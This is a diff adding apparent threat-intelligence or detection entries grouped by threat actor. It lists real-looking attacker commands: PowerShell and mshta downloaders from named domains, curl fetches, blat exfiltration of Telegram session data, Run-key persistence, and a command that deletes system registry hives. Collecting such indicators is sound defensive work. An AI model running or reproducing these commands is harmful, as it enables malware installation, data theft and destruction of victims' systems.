@@ -195,6 +195,71 @@ CHECKSUM
 %USERPROFILE%\UserCache.ini
 %USERPROFILE%\UserCache.ini.hta
 HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows
+HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\LOAD
+
+AZURE_RESOURCE_GROUP=
+ONEDRIVE_RESOURCE_GROUP=
+VB=
+AZURE_DECODE=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($env:AZURE_RESOURCE_GROUP+$env:ONEDRIVE_RESOURCE_GROUP))
+
+HKCU\Environment
+
+mastc.exe client --tls-skip-verify -v https://
+mshta.exe https://beltifay.com/implugnable/orthodox/nurses/intuitively/annexed.hta
+
+cmd.exe /c echo (new ActiveXObject(«Shell.Application»)).ShellExecute("%POWERSHELL_PATH%","-c $Content= Get-Content $env:USERPROFILE\\user.txt; Invoke-Expression $Content", "", "open", "0") > {user_path}\desktop.js
+cmd.exe /c echo $wuri = new-object system.UriBuilder('ab://' + '{url_to_powershell_script}'); $wuri.Scheme = 'https'; Invoke-Expression $(New-Object new.webclient).UploadString($wuri.Uri, '') > {user_path}\user.txt
+
+cmd.exe /c 'shutdown /r /f /t 5 && reg delete HKEY_LOCAL_MACHINE\SYSTEM /f && reg delete HKEY_LOCAL_MACHINE\SOFTWARE /f'
+
+# Team46
+powershell.exe -w Minimized -ep Bypass -nop -c "irm https://infosecteam.info/other.php?id=jdcz7vyqdoadr31gejeivo6g30cx7kgu | iex"
+irm
+iex
+Invoke-RestMethod
+Invoke-WebRequest
+iwr
+Invoke-Expression
+
+powershell.exe -w Minimized -ep Bypass -nop -c "iwr 'http://infosecteam[.]info/Job%20application.pdf' -OutFile $env:LOCALAPPDATA\Temp\102fa066-cc9d-4a80-b3aa-12d5df196b42.pdf -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.';$env:LOCALAPPDATA\Temp\102fa066-cc9d-4a80-b3aa-12d5df196b42.pdf; iwr 'http://infosecteam.info/base.php' -OutFile $env:LOCALAPPDATA\Yandex\YandexBrowser\Application\Wldp.dll -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.';
+C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -w Minimized -ep Bypass -nop -c "iwr 'https://srv480138.hstgr.cloud/uploads/scan_3824.pdf' -OutFile $env:LOCALAPPDATA\Temp\399ha122-tt9d-6f14-s9li-lqw7di42c792.pdf -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.';$env:LOCALAPPDATA\Temp\399ha122-tt9d6f14-s9li-lqw7di42c792.pdf;iwr 'https://srv480138.hstgr.cloud/report.php?query=$env:COMPUTERNAME' -OutFile $env:LOCALAPPDATA\Temp\AdobeUpdater.exe -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.1 YaBrowser/23.11.0.0 Safari/537.36';$env:LOCALAPPDATA\Temp\AdobeUpdater.exe;"
+
+# Rare Werewolf
+curl.exe -o C:\Intel\driver.exe hostingforme.nl/down/driver.exe
+curl.exe -o C:\Intel\pas.rar hostingforme.nl/down/pas.rar
+curl.exe -o C:\Intel\keys.rar hostingforme.nl/down/keys.rar
+curl.exe -o C:\Intel\MPK.rar hostingforme.nl/down/MPK.rar
+curl.exe -o C:\Intel\AnyDesk.exe hostingforme.nl/down/AnyDesk.exe
+curl.exe -o C:\Intel\Trays.rar http://hostingforme.nl/down/Trays.rar
+
+blat.exe -to %mail-in% -f "TELEGRAM<%mail-out%>" -server %smtp% -port 587 -u %mail-out% -pw %pass-out% -subject "Telegram %ComputerName%" -body "Telegram %ComputerName%" -attach "C:\Intel\tdata.rar"
+
+-server
+-u
+-pw
+-subject
+-body
+-attach
+
+rezet.cmd AnyDesk.exe --install C:\Intel\AnyDesk
+
+# XDSpy
+%WINDOWS%\System32\forfiles.exe /P %WINDOWS%\System32 /M write.exe /C "%PROGRAMDATA%\Microsoft\DeviceSync\uvxkhvso"
+
+"C:\Windows\sysnative\cmd.exe" /c cd /d "C:\Program Files (x86)\ConsulSoft\StatRKZU\Export" && expand -F:* install.cab "C:\Program Files (x86)\ConsulSoft\StatRKZU\Export" && ren wiasvc64.dll wiasvc.dll && wiasvc.bat
+"C:\Windows\sysnative\cmd.exe" /c cd /d "C:\Program Files\ConsulSoft\StatRKZU\Export" && expand -F:* install.cab "C:\Program Files (x86)\ConsulSoft\StatRKZU\Export" && ren wiasvc32.dll wiasvc.dll && wiasvc.bat
+
+Windows Image Acquisition Service
+
+systeminfo
+tasklist
+fsutil
+fsinfo
+hostname
+
+# Angry Likho
+\\document-cdn.org\Microsoft Office Word$\WINWORD.exe
+cmd.exe /c start "" reg.exe add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft Office Word" /t REG_SZ /d "\\94.156.8.166\Microsoft Office Word$\WINWORD.exe" /f & start "" msg * Произошла ошибка при открытии данного документа. Файл повреждене и не может быть восстановлен & start "" xcopy "\\79.132.128.47\image.jpg" "\" /Y
 
 # Do not remove the line
 
